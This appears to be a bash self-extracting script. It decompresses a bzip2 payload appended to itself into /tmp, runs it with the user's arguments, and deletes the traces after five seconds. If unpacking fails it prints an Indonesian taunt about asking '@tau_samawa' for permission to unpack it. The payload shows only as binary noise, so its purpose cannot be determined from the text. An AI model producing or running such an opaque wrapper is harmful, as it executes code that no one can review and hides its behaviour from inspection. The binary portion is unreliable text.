#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�sb� ���� ����������pD@  `
�䒚1P�K�$�  �D�����FySFM2d2=&�&I����h�2F���=@$�F��i��!��z�&�CCA�Ѡ��h  CCCL�  h��   p  �4444� � �hh �   CCCL�  h��   "Ih�Dji��)�����4ɣ� 4M6��&�d�v���ɆGQ[�L��Z���#8�����0�K
I�4��Q��{�'�)�I�8��!����Q�Ga6�z1���U_��pk�u�w�`��tVM3av�0�Όjӑi#:�P��?�$�f��[��`;���Ȱ$��^ϫ�Gt���;u�{�Uh8e�a�d$�������P?�"䄖����J�c��ͣhji��H�c
�:��^x�<2t|���IR�G��?����a� J�q4�"0rQ�Z<�d4���G�2�k����7}y����f��c, 0�1l ��3s�x��h�͍L?7Q�����[��b!��Z��{����c��>Tm� F˰�d�B��B�4������YР�-Hk��;DFtp�Ve7�`t�Z5WDdK]��f�:��m�N�a�ŉ��ɵN.Q�,8@)4}5PJt��r����Wr�M�L��:k�Qqe3 n��r�$����ӳz��j3�Jm���h��\ZC���bx�FJ�h��D�K�
aLZK�Q���zF6!k�4�A�(��<�8�f	ȗ%�����'8�H1DR�qXM� �e��ܟ� �&Q�>:��������xTA����D��$�2�II>�îa��^������ǣ���7!�=Cq�:%,�9��06�Ϸ�Fl�
�� ��@W�w�~� ����s���H�v<R?�*lYT7�����اJ�<ݺ�&*c&�:���w��O���6^��Hd��tقk4�@�B��D!�e!Qd�%e��s�k������"���2�p�u�и.k�Yr.�����v�}����_}�]u��==$�����p'�La������[�Hi��Ʒl��X���mv�-�͘�ˤ:�*��&��2@�	��ON���ʸ�[I���5��u9���.��'U@�r>`����upK��$!��(���w�?��7{U	ڛ�?V��Xd�	 S���$H�pO3����-�sH|�1 � ��`��^�;E�a��*y��O��s�9/<�_(Ɛ�$�*�R1%)��u�oK*�Js���~8�c��F�*�g�J�z �2�
i�A,qy�7��i	�H}~VM�q�D�X��z\���Z�*��"C�
L�ҲW'�lE�X,�+ >Ze^��l���e]w���|��P&J�%{Q�Nh��o��AB\��=� ����xy����Ƚ��	�Yj���D�pCùr��.�z�Q�D�*w��9��^M��>������IS�;��� �"߱`	��y�f��%�~r�"�=�����`�B�v��h !�'뎶����=d��m�X����07+�@t�k�d[E����sb�%eu�DO�-:�*h�#`�a�Q�z"8����E��Q�j� �@WS#���H�A�Ԡ�G�@HuQ}����*����h
��'�R׀]u�WG#G��p�u��Y �\:I���K���{Cډ���C��1��X�"�/�c39��k�$�MFNȆ�S�wSYI���,����Cюabt��	�m,s�gv�2�����q��D=�Ǝ�p�>�4��|�q�\�f8��Y�cf�Y�H8w�C��3m�6Y�܁��7t���ʧ
�B�������I��91nG� �.���k�p5�0�a�@
�]�Nju�lV5u>_ZW�i��k�F�B��ͦ��u��[�ir;�!�s������I�P#�݁������^�XȤ=�&�e�xL�8=�D �N�@�^���ޏeo��ZM� ���������r�Cj�}S�:z�N������<D;�QP��[��\��w�ֈB���uɴ~��E�P�kP&�ZP�������
���gk��Co����6Bz-!�\��isWN����"��5Nٙ�i@&ѝ
d.j6f�x�����X�+���ǉZ����(5 o�N�I
s��΃��Ֆv��`�Qb�\h���wN�S��2j��K�l.B����< acf�׭n�dd[�I�(dGl�՘����3/ڙ�H,M���ίo��14��� �F}���� ���Mg]8�B��u�sd04W֖�U�#�5�� ,�J7M���È�.7|pM�������U
}�m=�%"}�pP��CE$ *��QW�DiH�S���"�(Hx��K 